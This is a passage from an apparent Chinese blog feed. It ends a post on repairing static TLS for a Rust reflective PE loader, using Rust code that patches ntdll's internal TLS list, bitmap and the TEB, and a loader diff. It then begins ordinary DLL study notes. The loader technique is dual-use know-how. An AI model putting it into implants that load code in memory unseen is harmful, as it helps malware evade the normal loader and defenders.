<code>LdrpAllocateTlsEntry</code>, 找到后再去查找其引用， 找到在 <code>LdrpHandleTlsData</code> 的引用位置后， 判断该位置是否在<code>.pdata</code> 表中被记录， 如果被记录则反查到 <code>LdrpHandleTlsData</code>， 不然就向上找到填充的<code>0xCC</code>或<code>0x90</code>为止， 至此， 基本上将需要记录特征字符及偏移位置精简到几个判断的情况了</p><p>当然， 如果基于前人的工作， 我们只需要考虑<code>win11</code> 的情况就不必解析<code>.pdata</code> 段了， 这里就许愿 <code>windows</code> 后续的更新不会再有其它情况了 :)</p><p>而方法二呢， 我们是否可以实现一个 <code>LdrpHandleTlsData</code> 来完成工作呢，通过<code>hook</code> 线程启动来为每一个新线程做处理？这自然也是可行的，比如 <a href="http://www.nynaeve.net/Code/VistaImplicitTls.cpp">VistaImplicitTls</a> 或 <a href="https://github.com/bb107/MemoryModulePP/tree/master">MemoryModulePP</a>  但在我们的场景中， 稳定性和简洁性更为重要， 但如果只是为了在纯c环境中加载我们的的 <code>hello world</code>， 我们可以写一个简化的 <code>demo</code>, 参考于 <a href="https://www.unknowncheats.me/forum/general-programming-and-reversing/428195-manually-fixing-static-tls.html">Manually-fixing-static-tls</a></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">ldrp_handle_tls_data_demo</span>(<br>    module_base: *<span class="hljs-keyword">const</span> core::ffi::c_void,<br>    module_entry: *<span class="hljs-keyword">mut</span> LDR_DATA_TABLE_ENTRY,<br>) &#123;<br>    (*module_entry).DllBase = module_base <span class="hljs-keyword">as</span> _;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">size</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">tls_directory</span>: *<span class="hljs-keyword">mut</span> IMAGE_TLS_DIRECTORY = <span class="hljs-title function_ invoke__">MRtlImageDirectoryEntryToData</span>(<br>        module_base <span class="hljs-keyword">as</span> _, <br>        <span class="hljs-number">1</span>,<br>        IMAGE_DIRECTORY_ENTRY_TLS,<br>        &amp;<span class="hljs-keyword">mut</span> size <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> _ <span class="hljs-keyword">as</span> _<br>    ) <span class="hljs-keyword">as</span> _;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">old</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-title function_ invoke__">MVirtualProtect</span>(tls_directory <span class="hljs-keyword">as</span> _, size_of::&lt;IMAGE_TLS_DIRECTORY&gt;(), PAGE_EXECUTE_READWRITE, &amp;<span class="hljs-keyword">mut</span> old <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> _ <span class="hljs-keyword">as</span> _);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[+] size is &#123;:x&#125;&quot;</span>, size);<br>    <span class="hljs-keyword">if</span> tls_directory.<span class="hljs-title function_ invoke__">is_null</span>() || size.<span class="hljs-title function_ invoke__">eq</span>(&amp;<span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[+] tls directory is null&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[+] tls directory is not null, it is &#123;:#?&#125;&quot;</span>, tls_directory <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> core::ffi::c_void);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">LdrpTlsList</span>: *<span class="hljs-keyword">const</span> core::ffi::c_void = <span class="hljs-number">0x00007ffa46110388usize</span> <span class="hljs-keyword">as</span> _;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">LdrpLdrpTlsBitmap</span>: *<span class="hljs-keyword">const</span> core::ffi::c_void = <span class="hljs-number">0x00007ffa461162a0usize</span> <span class="hljs-keyword">as</span> _;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">index</span> = <span class="hljs-title function_ invoke__">MRtlFindClearBitsAndSet</span>(<br>        LdrpLdrpTlsBitmap <span class="hljs-keyword">as</span> _, <br>        <span class="hljs-number">1</span>, <br>        <span class="hljs-number">0</span><br>    );<br><br>    (*tls_directory).AddressOfIndex = index <span class="hljs-keyword">as</span> _;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[+] index is &#123;:x&#125;&quot;</span>, index);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">tls_entry</span>: *<span class="hljs-keyword">mut</span> TLS_ENTRY = <span class="hljs-title function_ invoke__">MHeapAlloc</span>(size_of::&lt;TLS_ENTRY&gt;(), <span class="hljs-number">0</span>) <span class="hljs-keyword">as</span> _;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[+] index is &#123;:x&#125;&quot;</span>, index);<br>    (*tls_entry).TlsDirectory = *tls_directory;<br>    (*tls_entry).ModuleTlsData = module_entry;<br>    (*tls_entry).TlsIndex = index <span class="hljs-keyword">as</span> _;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[+] will insert tail list&quot;</span>);<br>    <span class="hljs-comment">// RtlInitializeListEntry(&amp;mut (*tls_entry).TlsEntryLinks as *mut _ as _);</span><br>    <span class="hljs-title function_ invoke__">InsertTailList</span>(<br>        LdrpTlsList <span class="hljs-keyword">as</span> _, <br>        &amp;<span class="hljs-title function_ invoke__">mut</span> (*tls_entry).TlsEntryLinks <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> _ <span class="hljs-keyword">as</span> _<br>    );<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[+] insert tail list success&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">thread_base_info</span>: THREAD_BASIC_INFORMATION = core::mem::<span class="hljs-title function_ invoke__">zeroed</span>();<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">hthread</span> = <span class="hljs-title function_ invoke__">MGetCurrentThread</span>();<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">dw</span>: <span class="hljs-type">u32</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-title function_ invoke__">MNtQueryInformationThread</span>(<br>        hthread, <br>        ThreadBasicInformation <span class="hljs-keyword">as</span> _, <br>        &amp;<span class="hljs-keyword">mut</span> thread_base_info <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> _ <span class="hljs-keyword">as</span> _, <br>        size_of::&lt;THREAD_BASIC_INFORMATION&gt;() <span class="hljs-keyword">as</span> _, <br>        &amp;<span class="hljs-keyword">mut</span> dw <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> _);<br>    <span class="hljs-title function_ invoke__">MCloseHandle</span>(hthread);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[+] query information thread&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">teb1</span>: *<span class="hljs-keyword">mut</span> TEB2 = thread_base_info.TebBaseAddress <span class="hljs-keyword">as</span> _;<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">new_tls</span>: *<span class="hljs-keyword">mut</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">usize</span> = <span class="hljs-title function_ invoke__">MHeapAlloc</span>((index + <span class="hljs-number">1</span>) <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span> * size_of::&lt;<span class="hljs-type">usize</span>&gt;(), <span class="hljs-number">0</span>) <span class="hljs-keyword">as</span> _;<br><br>    <span class="hljs-keyword">if</span> (*teb1).ThreadLocalStoragePointer.<span class="hljs-title function_ invoke__">is_null</span>() &#123;<br>        <span class="hljs-title function_ invoke__">memset</span>(<br>            new_tls <span class="hljs-keyword">as</span> _, <br>            <span class="hljs-number">0</span>, <br>            index <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span> * size_of::&lt;<span class="hljs-type">usize</span>&gt;());<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_ invoke__">memcpy</span>(<br>            new_tls <span class="hljs-keyword">as</span> _, <br>            (*teb1).ThreadLocalStoragePointer <span class="hljs-keyword">as</span> _, <br>            index <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span> * size_of::&lt;<span class="hljs-type">usize</span>&gt;());<br>    &#125;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[+] thread lodal storage is &#123;:x&#125;&quot;</span>, (*teb1).ThreadLocalStoragePointer <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>);<br><br>    (*teb1).ThreadLocalStoragePointer = new_tls <span class="hljs-keyword">as</span> _;<br>    <span class="hljs-comment">// (*teb1).ThreadLocalStoragePointer =  null_mut();</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">size</span> = (*tls_directory).EndAddressOfRawData - (*tls_directory).StartAddressOfRawData;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">tls_data</span> = <span class="hljs-title function_ invoke__">MHeapAlloc</span>(size <span class="hljs-keyword">as</span> _, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">memcpy</span>(<br>        tls_data <span class="hljs-keyword">as</span> _, <br>        (*tls_directory).StartAddressOfRawData <span class="hljs-keyword">as</span> _, <br>        size <span class="hljs-keyword">as</span> _);<br>    *new_tls.<span class="hljs-title function_ invoke__">offset</span>(index <span class="hljs-keyword">as</span> _) = tls_data <span class="hljs-keyword">as</span> _;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>当然， 这也与 <code>xbox loader</code> 的尝试类似</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs rust">diff --git a/crates/loader/src/lib.rs b/crates/loader/src/lib.rs<br>index <span class="hljs-number">97311</span>d0..d66773d <span class="hljs-number">100755</span><br>--- a/crates/loader/src/lib.rs<br>+++ b/crates/loader/src/lib.rs<br>@@ -<span class="hljs-number">180</span>,<span class="hljs-number">34</span> +<span class="hljs-number">185</span>,<span class="hljs-number">53</span> @@ <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">reflective_loader_impl</span>(context: LoaderContext) &#123;<br>             .OptionalHeader<br>             .AddressOfEntryPoint <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>) <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> c_void;<br><br>-    <span class="hljs-keyword">let</span> <span class="hljs-variable">tls_directory</span> = &amp;ntheader_ref.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];<br>+    <span class="hljs-keyword">let</span> <span class="hljs-variable">tls_directory</span> =<br>+        &amp;ntheader_ref.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>];<br>+<br>+    <span class="hljs-comment">// Grab the TLS data from the PE we&#x27;re loading</span><br>+    <span class="hljs-keyword">let</span> <span class="hljs-variable">tls_data_addr</span> =<br>+        baseptr.<span class="hljs-title function_ invoke__">offset</span>(tls_directory.VirtualAddress <span class="hljs-keyword">as</span> <span class="hljs-type">isize</span>) <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> IMAGE_TLS_DIRECTORY64;<br>+<br>+    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Patch the module list</span><br>+    <span class="hljs-keyword">let</span> <span class="hljs-variable">tls_index</span> = <span class="hljs-title function_ invoke__">patch_module_list</span>(<br>+        context.image_name,<br>+        baseptr,<br>+        imagesize,<br>+        context.fns.get_module_handle_fn,<br>+        tls_data_addr,<br>+        context.fns.virtual_protect,<br>+        entrypoint,<br>+    );<br>+<br>     <span class="hljs-keyword">if</span> tls_directory.Size &gt; <span class="hljs-number">0</span> &#123;<br>         <span class="hljs-comment">// Grab the TLS data from the PE we&#x27;re loading</span><br>         <span class="hljs-keyword">let</span> <span class="hljs-variable">tls_data_addr</span> =<br>             baseptr.<span class="hljs-title function_ invoke__">offset</span>(tls_directory.VirtualAddress <span class="hljs-keyword">as</span> <span class="hljs-type">isize</span>) <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> IMAGE_TLS_DIRECTORY64;<br><br>-        <span class="hljs-keyword">let</span> <span class="hljs-variable">tls_data</span>: &amp;IMAGE_TLS_DIRECTORY64 = <span class="hljs-keyword">unsafe</span> &#123; core::mem::<span class="hljs-title function_ invoke__">transmute</span>(tls_data_addr) &#125;;<br>+        <span class="hljs-keyword">let</span> <span class="hljs-variable">tls_data</span>: &amp;<span class="hljs-keyword">mut</span> IMAGE_TLS_DIRECTORY64 = <span class="hljs-keyword">unsafe</span> &#123; core::mem::<span class="hljs-title function_ invoke__">transmute</span>(tls_data_addr) &#125;;<br><br>         <span class="hljs-comment">// Grab the TLS start from the TEB</span><br>         <span class="hljs-keyword">let</span> <span class="hljs-variable">tls_start</span>: *<span class="hljs-keyword">mut</span> *<span class="hljs-keyword">mut</span> c_void;<br>         <span class="hljs-keyword">unsafe</span> &#123; core::arch::asm!(<span class="hljs-string">&quot;mov &#123;&#125;, gs:[0x58]&quot;</span>, <span class="hljs-title function_ invoke__">out</span>(reg) tls_start) &#125;<br><br>-        <span class="hljs-keyword">let</span> <span class="hljs-variable">tls_index</span> = <span class="hljs-keyword">unsafe</span> &#123; *(tls_data.AddressOfIndex <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> <span class="hljs-type">u32</span>) &#125;;<br>-<br>         <span class="hljs-keyword">let</span> <span class="hljs-variable">tls_slot</span> = tls_start.<span class="hljs-title function_ invoke__">offset</span>(tls_index <span class="hljs-keyword">as</span> <span class="hljs-type">isize</span>);<br>         <span class="hljs-keyword">let</span> <span class="hljs-variable">raw_data_size</span> = tls_data.EndAddressOfRawData - tls_data.StartAddressOfRawData;<br>-        *tls_slot = (context.fns.virtual_alloc)(<br>+        <span class="hljs-keyword">let</span> <span class="hljs-variable">tls_data_addr</span> = (context.fns.virtual_alloc)(<br>             ptr::<span class="hljs-title function_ invoke__">null</span>(),<br>-            raw_data_size <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>,<br>+            raw_data_size <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>, <span class="hljs-comment">// + tls_data.SizeOfZeroFill as usize,</span><br>             MEM_COMMIT,<br>             PAGE_READWRITE,<br>         );<br><br>-        <span class="hljs-comment">// if !tls_start.is_null() &#123;</span><br>-        <span class="hljs-comment">//     // Zero out this memory</span><br>-        <span class="hljs-comment">//     let tls_slots: &amp;mut [u64] = unsafe &#123; core::slice::from_raw_parts_mut(tls_start, 64) &#125;;</span><br>-        <span class="hljs-comment">//     tls_slots.iter_mut().for_each(|slot| *slot = 0);</span><br>-        <span class="hljs-comment">// &#125;</span><br>+        core::ptr::<span class="hljs-title function_ invoke__">copy_nonoverlapping</span>(<br>+            tls_data.StartAddressOfRawData <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> _,<br>+            tls_data_addr,<br>+            raw_data_size <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>,<br>+        );<br>+<br>+        <span class="hljs-comment">// Update the TLS index</span><br>+        core::ptr::<span class="hljs-title function_ invoke__">write</span>(tls_data.AddressOfIndex <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">u32</span>, tls_index);<br>+        *tls_slot = tls_data_addr;<br><br>         <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">callbacks_addr</span> = tls_data.AddressOfCallBacks <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> *<span class="hljs-keyword">const</span> c_void;<br>         <span class="hljs-keyword">if</span> !callbacks_addr.<span class="hljs-title function_ invoke__">is_null</span>() &#123;<br></code></pre></td></tr></table></figure><h3 id="闲言片语"><a href="#闲言片语" class="headerlink" title="闲言片语"></a>闲言片语</h3><p>由于测试性代码和工程化的差距还有很多距离， 而本文并非为了说明工程化过程， 因此本文只讨论了windows11版本且程序在64位的情况， 32位就会略有不同</p><p>如果能将文章看到这里， 希望各位都有所收获， 那么剩下的内容就留给各位自己来完成啦</p><p>当然， 由于本人才疏学浅， 因此如有错误的地方欢迎各位与我讨论， 让我们一起追根溯源 :）</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p>非常感谢下面几篇文章为本文和解决<code>TLS</code>问题所给予的非常大的帮助:)</p><p>尤其感谢 <code>Ken Johnson(Skywing)</code> 对 <code>windows TLS</code> 机制的详细分析与解释， 没有他的系列文章， 本文的篇幅和所要花费的时间将远超预期 :)</p><p><a href="http://www.nynaeve.net/?p=180">http://www.nynaeve.net/?p=180</a><br><a href="https://landaire.net/reflective-pe-loader-for-xbox/">https://landaire.net/reflective-pe-loader-for-xbox/</a><br><a href="https://en.wikipedia.org/wiki/Thread-local_storage">Thread_local_Storage</a><br><a href="https://github.com/Warrenren/inside-rust-std-library/blob/main/16-std%E5%BA%93(%E4%BA%94)%E7%BA%BF%E7%A8%8B%E7%AE%A1%E7%90%86.md">16-std库(五)线程管理</a><br><a href="https://www.unknowncheats.me/forum/general-programming-and-reversing/274023-static-tls-storage.html">static-tls-storage</a><br><a href="https://www.unknowncheats.me/forum/general-programming-and-reversing/428195-manually-fixing-static-tls.html">Manually-fixing-static-tls</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>IOM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DLL随笔</title>
    <link href="/2021/04/16/DLL%E9%9A%8F%E7%AC%94/"/>
    <url>/2021/04/16/DLL%E9%9A%8F%E7%AC%94/</url>
    
    <content type="html"><![CDATA[<blockquote><p>简要记了一下《程序员的自我修养》第九章的笔记,之前读的时候跳过了windows的内容,现在重新捡起简要记一下,做了不必要的删减和自作聪明的增添</p></blockquote><h1 id="DLL简介"><a href="#DLL简介" class="headerlink" title="DLL简介"></a>DLL简介</h1><p>windows下的dll和exe文件都是有PE格式的二进制文件，但其不同在于PE文件头中有一个符号位表示其是EXE还是DLL，并且DLL文件的后缀也不一定是.dll，还有可能是.ocx(OCX控件包含ActiveX控制的库)或者.CPL(控制面板程序),.DRV（旧式的系统驱动程序）。</p><p>ELF文件可以实现运行时加载动态链接,在windows下也有类似的机制,比如ActiveX技术就基于此</p><h2 id="进程地址空间和内存管理"><a href="#进程地址空间和内存管理" class="headerlink" title="进程地址空间和内存管理"></a>进程地址空间和内存管理</h2><p>在远古的windows版本下,程序运行方式还不能被称为进程,所有的应用程序共享同一个地址空间,也就是可以随意访问DLL的内容,不过太过久远就随笔一记即可</p><p>后来32位windows开始支持进程拥有独立的地址空间,一个DLL在不同的进程中拥有不同的私有数据副本,类似ELF的共享对象,但ELF中是地址无关代码机制,因此可以多进程共享一份代码,但DLL代码并非代码无关,因此只在某些情况下可以被多进程间共享</p><h2 id="基地址和RVA"><a href="#基地址和RVA" class="headerlink" title="基地址和RVA"></a>基地址和RVA</h2><p>PE中有两个较为常见的概念:基地址(Base Address),相对地址(RVA,Relative Virtual Address)</p><p>所谓基地址,就是当PE文件被装载时,进程地址空间的起始地址,而对于PE文件来说,他都有一个优先装载的基地址,即PE文件头的Image Base</p><p>常见的EXE文件,Image Base一般值是:0x400000,对于DLL而言,该值一般为: 0x10000000</p><p>windows在装在DLL时,会尝试把它装载到由Image Base指定的虚拟地址,而若改地址区域已被其他模块占用,那么PE装载器会选用其他空闲地址,而相对地址是一个地址相对改地址的偏移,即offset<br>如PE被装进0x1000000,那么RVA为0x1000的地址就是0x1001000</p><p><em>Address &#x3D; Base Address + RVA(offset)</em></p><h2 id="DLL共享数据段"><a href="#DLL共享数据段" class="headerlink" title="DLL共享数据段"></a>DLL共享数据段</h2><p>在win32下,windows系统提供了一系列API实现进程间通信(IPC),其中有一种方法是使用DLL来实现进程间通信</p><p>正常情况下,每个DLL的数据段在各个进程中都是独立的,每个进程都拥有自己的副本,但是windows允许DLL的数据段设置成共享的,任何进程都可以共享该DLL的同一份数据段,而有一个常见的做法是将一些需要进程间共享的变量分离出来,放到另一个数据段中,然后将该段设置成进程间可共享的,即一部分私有,一部分共享,但这也是极其危险的</p><blockquote><p>下面的内容可能会大量采取书上的原文,文字内容较多</p></blockquote><h2 id="DLL的简单例子"><a href="#DLL的简单例子" class="headerlink" title="DLL的简单例子"></a>DLL的简单例子</h2><p>对于DLL的创建和使用而言,最基本的概念是导出(Export)表。在ELF中是默认导出共享库所有的全局符号的,也就是说默认共享库中所有的全局函数和变量在默认情况下都可以被其他模块使用,但在DLL中,我们需要显式的导入我们需要的符号,否则其默认不导出所有符号,而我们在程序中使用导出的符号时,这个过程被称为导入。</p><p>MSVC(Microsoft Visual C++)提供了一系列的C&#x2F;C++拓展来指定符号的导入导出,对于一些支持windows平台的编译器,比如Intel C++,GCC windows版等都支持这种拓展</p><p>我们可以通过<code>&quot;__declspec&quot;</code>属性关键字来修饰某个函数或变量,当我们使用<code>&quot;__delspec(dllexport)&quot;</code>时就表示该符号是从本DLL导出的符号,而如果使用的是<code>&quot;__declspec(dllimport)&quot;</code>则表示其似从别的DLL中导入的符号</p><blockquote><p>在c++中,如果希望导入或导出的符号符号C语言的符号修饰规则,则必须在前面加上<code>external &quot;c&quot;</code>来防止C++对其进行符号修饰</p></blockquote><p>除了使用<code>&quot;__declspec&quot;</code>属性关键字来指定导入导出符号之后,我们也可以使用”.def”文件来生命导入导出符号,该拓展名的文件类似于ld链接器的链接叫本文件,可以当作link链接器的输入文件,用以控制链接过程,其中的IMPORT或EXPORTS段可以用来声明导入导出符号,该方法不止适用于C&#x2F;C++,还适用于其他语言。</p><h2 id="创建DLL"><a href="#创建DLL" class="headerlink" title="创建DLL"></a>创建DLL</h2><p>简单写一下例子即可:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">__declspec(dllexport) Add(<span class="hljs-type">double</span> a, <span class="hljs-type">double</span> b)<br>&#123;<br>        <span class="hljs-keyword">return</span> a+b;<br>&#125;<br>__declspec(dllexport) Sub(<span class="hljs-type">double</span> a, <span class="hljs-type">double</span> b)<br>&#123;<br>        <span class="hljs-keyword">return</span> a-b;<br>&#125;<br>__declspec(dllexport) Mul(<span class="hljs-type">double</span> a, <span class="hljs-type">double</span> b)<br>&#123;<br>        <span class="hljs-keyword">return</span> a*b;&#125;<br></code></pre></td></tr></table></figure><p>编译可以使用vs(MSCV)自带的cl,加&#x2F;LDd参数表示Debug版,不加参数就生成EXE文件,而使用&#x2F;LD则表示生成RELEASE版的DLL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">D:\0000tttteeesstt&gt;cl /LDd test.c<br>用于 x64 的 Microsoft (R) C/C++ 优化编译器 19.27.29111 版<br>版权所有(C) Microsoft Corporation。保留所有权利。<br><br>test.c<br>Microsoft (R) Incremental Linker Version 14.27.29111.0<br>Copyright (C) Microsoft Corporation.  All rights reserved.<br><br>/out:test.dll<br>/dll<br>/implib:test.lib<br>test.obj<br>  正在创建库 test.lib 和对象 test.exp<br></code></pre></td></tr></table></figure><p>可以看到一共生成了四个文件:test.dll,test.obj.test.exp,test.lib文件</p><ul><li>test.obj是编译的目标文件</li><li>test.dll就是我们用的dll文件</li><li>test.lib是一组目标文件的集合</li><li>test.exp文件为链接器在创建DLL文件时的临时文件</li></ul><p>然后用dumpbin工具来查看生成的DLL文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ &gt;dumpbin /EXPORTS test.dll<br>Microsoft (R) COFF/PE Dumper Version 14.27.29111.0<br>Copyright (C) Microsoft Corporation.  All rights reserved.<br><br><br>Dump of file test.dll<br><br>File Type: DLL<br><br>  Section contains the following exports <span class="hljs-keyword">for</span> test.dll<br><br>    00000000 characteristics<br>    FFFFFFFF <span class="hljs-keyword">time</span> <span class="hljs-built_in">date</span> stamp<br>        0.00 version<br>           1 ordinal base<br>           3 number of <span class="hljs-built_in">functions</span><br>           3 number of names<br><br>    ordinal hint RVA      name<br><br>          1    0 00001000 Add<br>          2    1 00001060 Mul<br>          3    2 00001030 Sub<br><br>  Summary<br><br>        3000 .data<br>        3000 .pdata<br>       13000 .rdata<br>        1000 .reloc<br>       37000 .text<br>        1000 _RDATA<br><br></code></pre></td></tr></table></figure><p>可以看到该DLL中有三个导出函数并且可以看到他们的相对地址</p><h2 id="使用DLL"><a href="#使用DLL" class="headerlink" title="使用DLL"></a>使用DLL</h2><p>程序使用DLL的过程其实就是引入DLL中的导出函数和符号的过程,即导入过程</p><p>对于从其他DLL导入的符号,我们需要使用<code>&quot;__declspec(dllimport)&quot;</code>显式的声明某个符号为导入符号</p><p>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td 